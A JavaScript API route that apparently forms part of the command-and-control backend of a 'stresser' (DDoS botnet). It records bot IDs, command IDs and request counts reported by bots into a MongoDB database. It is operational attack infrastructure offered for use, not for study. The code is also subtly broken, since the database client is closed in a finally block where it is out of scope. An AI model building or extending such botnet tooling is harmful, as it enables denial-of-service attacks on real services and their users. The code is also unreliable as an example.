import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { botId, commandId, requests, success } = req.body;
  if (!botId || !commandId) return res.status(400).json({ error: 'botId and commandId required' });

  try {
    const client = new MongoClient(uri);
    await client.connect();
    const db = client.db('stresser');
    const results = db.collection('results');

    await results.insertOne({
      botId,
      commandId,
      requests: parseInt(requests) || 0,
      success: success || false,
      reportedAt: new Date()
    });

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  } finally {
    await client.close();
  }
}